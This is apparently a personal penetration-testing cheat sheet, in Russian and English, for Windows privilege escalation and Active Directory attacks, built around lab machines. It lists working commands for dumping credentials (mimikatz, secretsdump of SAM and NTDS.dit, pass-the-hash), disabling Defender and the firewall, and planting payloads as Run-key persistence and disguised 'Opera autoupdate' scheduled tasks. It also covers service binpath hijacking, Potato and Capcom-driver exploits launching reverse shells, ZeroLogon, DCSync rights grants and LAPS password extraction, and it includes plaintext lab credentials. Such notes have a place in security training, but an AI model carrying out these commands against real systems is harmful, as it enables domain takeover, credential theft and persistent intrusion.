# Up_windows

# Credential Manager

    # web credentials
    
    vaultcmd /list
    VaultCmd /listproperties:"Web Credentials"
    VaultCmd /listcreds:"Web Credentials"
    https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
    powershell -ex bypass
    Import-Module C:\Tools\Get-WebCredentials.ps1
    Get-WebCredentials

    # Посмотреть сохраненный креды windows
    cmdkey /list
    runas /savecred /user:THM.red\thm-local cmd.exe

# повышение привелегий серез UAC

msconfig
azman.msc

# подключить сетевой диск

net use * \\ta-d.local\NETLOGON - подключить сетевой диск

# Поиск описания пользователей груп и политик и добавление (Cбор информации в домене)

    net user /domain пользователи домена
    net user administrator /domain в какие группы входит пользователь
    net localgroup
    net group /domain
    net group "domain admins" кто входит в группы
    net accounts - парольная политика пользователя
    net accounts /domain

# Добавление пользователя в домен и в группу

    net user mighty Password123! /add /domain

    net group "domain admins" max /add /domain

    net localgroup 'Remote Management Users' max /add





Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description






Get-ADUser -identity administrator -properties *
Get-ADUser -identity administrator -properties memberof

Get-ADcomputer -filter * -properties * | ft nmae, ipv4adress компутеры в домене

Systeminfo - отображает подробную информацию о конфигурации компьютера и его операционной системы.

wmic qfe  - перечислить патчи

wmic logicaldisk - перечислить диски




# Поиск строк в реестре

reg query HKLM /f password /t REG_SZ /s | findstr /s flag

# Run AS without terminal

runas /netonly /user:domain\user command"

https://github.com/antonioCoco/RunasCs

# SeLoadDriverPrivelege

POC -->compile
https://github.com/TarlogicSecurity/EoPLoadDriver/

Driver 
https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys

driver exploit --> compile
https://github.com/tandasat/ExploitCapcom  --> add reverseshell!!!!!!

-->> .\LoadDriver.exe System\CurrentControlSet\hack C:\Users\svc-print\capcom.sys
-->> .\ExploitCapcom.exe (change shell)



reverse shell c#
https://www.puckiestyle.nl/c-simple-reverse-shell/ ----> C:\windows\microsoft.net\framework64\v4.0.30319> .\csc.exe ---> 

# ZERO_LOGON

python3 cve-2020-1472-exploit.py fuse 10.10.10.193 (проверка на уязвимость)

impacket-secretsdump -just-dc -no-pass fuse\$@10.10.10.193

# NTML atack

---Создание ярлыков

https://github.com/Greenwolf/ntlm_theft

# Расшифровка учетных записей
https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators

# Расшифровка пароля аес256 из GROUP.xmls

gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ     где edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ - зашифрованый пароль


# enumeration

systeminfo

netstat -ano | findstr ":<port>"

tasklist /svc

# Истоия журнала PowerShell

type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Токен имперсонейшн

C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

Start another listener on Kali.

Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999

# JuicyPotato (SeImpersonatePrivilege)

https://github.com/ohpe/juicy-potato/releases

http://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/

.\JuicyPotato.exe -t * -p C:\users\userpool\desktop\start.bat -l 1338 -c '{d20a3293-3341-4ae8-9aaf-8e397cb63c34}'


# Подсказки для виндовс

# https://github.com/davidbombal/Ethical-Hacking/blob/main/Windows%20Pentesting%20with%20OffSec

https://sushant747.gitbooks.io/total-oscp-guide/content/basics_of_windows.html

# Список SPN внутри домена

setspn -T TA-D.Local -Q */*

klist

# Отключить Дефендер

sc stop windefend

sc query windefend

sc queryex type= service - все процессы

# Просмотр брандмауэра

netsh advfirewall firewall

netsh advfirewall show currentprofile

netsh advfirewall firewall show rule name=all

netsh firewall show state

netsh firewall show config

netsh advfirewall set allprofiles state off

# Создание теневой копии диска

vssadmin create shadow /for=c:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy


Поиск секретов


cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config *.vbs


МИМИКАТЗ
мимикатз в метасплойт 

kiwi_cmd lsadump::sam


-----Распарсить SAM

secretsdump.py -sam sam -system system LOCAL 

impacket-secretsdump hacker.local/user:password@ip_adress

secretsdump.py hacker.local/user:password@ip_adress


secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 --> password (Снаружи домена парсит ntds.dit)

-----Распарсить NTDS.DIT

impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL >> text  

Распарсить на лету зная только хеш или пароль

impacket-secretsdump Administrator@192.168.50.200 -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71

secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator --> password (Снаружи домена парсит ntds.dit)

secretsdump.py egotistical-bank/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175

----- Получить 10 последних пользователей

Нужен system и security

reg save hklm\system c:\system 

reg save hklm\security c:\security

Подробнее: https://www.securitylab.ru/analytics/517178.php

и пытаемся крякнуть мскеш2

john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt filehash



Psexec -i \\192.168.50.200 -u administrator -s cmd.exe Привелигерованный режим... (если уже админ то ситем)

Имперсонификация
PsExec64.exe -i -s cmd
PsExec64.exe -i -u "nt authority\local service" cmd

для psexec
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f





# Реестр виндовс 

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run - запрос значения ветки

reg query HKLM /f password /t REG_SZ /s - поиск слова password в реестре

reg qury HKLM\SYSTEM\CurrentControlSet\services\ - запрос списка сервисов

 sc config daclsvc binpath= "net localgroup administrators user /add" - использование возможности конфига сервиса
 
 sc qc daclsvc - запрос параметров сервиса

sc query daclsvc - состояние сервиса
 
Автозагрузка.....

"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

Если у вас права обычного пользователя, следует использовать ветку реестра HKCU

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
 
reg add "HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"



Если у вас есть админские права в системе, следует использовать ветку HKLM — в таком случае каждый раз при запуске системы будет выполняться payload.exe или dll. Этот способ хорош тем, что не зависит от пользователя, который логинится в систему.

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v payload /t REG_SZ /d "C:\tmp\payload.dll"
 
reg add “HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run” /v payload /t REG_SZ /d “C:\tmp\payload.exe”

********************************

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f

 In the command prompt type: sc start regsvc

# Пример создания запланированной задачи:

schtasks /create /sc minute /mo 5 /tn "Opera scheduled Autoupdate 1594994248" /tr C:\tmp\Opera_autoupdate1594994248.exe

at 13:01 /interactive cmd запуск с правами администратора!!!

chcp 65001

psexec -i \\\adress -u user cmd

python smbexec.py ignite/administrator:Ignite@987@192.168.1.105

***************************************************************************************************************************************************


# Сервисы Windows
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.State -like 'Running'}

C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc - проверка разрешений доступа к слжбам виндовс 

sc.exe qc daclsvc - используется для получения информации о конфигурации и параметрах обслуживания приложения DAclSvc 

sc.exe query daclsvc - информация о состянии службы (старт, стоп)

services

# Service abusing

sc.exe config browser binpath="C:\Windows\system32\cmd.exe /c net user administrator Password321123"

sc.exe stop browser

sc.exe start browser



------Если есть группа и привелегии по управлению сервисами  --->>>




sc config vss binpath= "\"C:\PrivEsc\reverse.exe\"" - смена пути к файлу сервиса



sc.exe stop vss
sc.exe start vss



# Узнать у кого доступ в директорию

accesschk64.exe -wvu -accepteula "C:\Program Files\Autorun Program"

C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc - доступ к сервису

icacls "C:\xampp\apache\bin\httpd.exe"

Get-acl file | fl *




# Enumerate specific service
Get-CimInstance -ClassName Win32_Service -Filter "Name='mysql'" | Select-Object StartMode

# Скрипты векторов повышения привелегий

cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config *.vbs

findstr /s /p /i /n /m "password" \\ta-d.local\SYSVOL\*.xml *.ini *.txt *.config *.vbs



!!! http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar

# Проверка мисконфигов виндовс

!!! https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS


  https://github.com/SecWiki/windows-kernel-exploits все эксплойты!!!

  # Сканер Эксплойтов виндовс

./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 

./wes.py systeminfo.txt -e --color --severity critical

# Hack Triks
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens



# Проверка сертификатов
certipy-ad find -u svc_ldap@authority.htb -p lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222

# Добавление компутера в домен
impacket-addcomputer authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -method LDAPS -computer-name 'Evil-PC' -computer-pass 'Password123'

# Power Shell

powershell -ep bypass (Обход блокировки скриптов)

Import-Module .\PowerView.ps1 (Загрузить модуль в память)

Set-ExecutionPolicy Unrestricted  - разрешить выполнение скриптов

Загрузка скриптов без получения разрешения на запуск POwerShell
IEX (New-Object Net.WebClient).DownloadString("file://$PWD/pw.ps1")

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
  для которого import-module ./powerup.ps1 и затем Invoke-AllChecks или 
  Invoke-AllChecks | out-file -Encoding ASCII checks.txt

https://github.com/HarmJ0y/PowerUp

# Power view

https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

Get-NetUser | select cn    (список пользователей)

Get-NetGroup -GroupName *admin*   (список групп содержащих *админ*)

добавление прав пользователю для дссинк

$pass = convertto-securestring 'qwerty123' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\max', $pass)
Add-ObjectACL -PrincipalIdentity max -Credential $cred -Rights DCSync



# Hot potato


Exploitation

Windows VM

1. In command prompt type: powershell.exe -nop -ep bypass
2. In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
3. In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
4. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators

# LAPS (взлом)

    если юзер входит в группу laps

    https://github.com/ztrhgf/LAPS.git

    import-module AdmPwd.PS\AdmPwd.PS.psd1

    get-admpwdpassword -computername dc01 | Select password

    Получение пароля LAPS Admin
    Юзер состоит в групе LAPS Admin

      https://github.com/n00py/LAPSDumper.git
  
      $ python laps.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local

      В Виндовс Laps

  https://github.com/leoloobeek/LAPSToolkit.git

  Find-AdmPwdExtendedRights -Identity * (THMorg)
  runas /netonly /user:bk-admin "cmd.exe"
  Get-AdmPwdPassword -ComputerName Creds-Harvestin
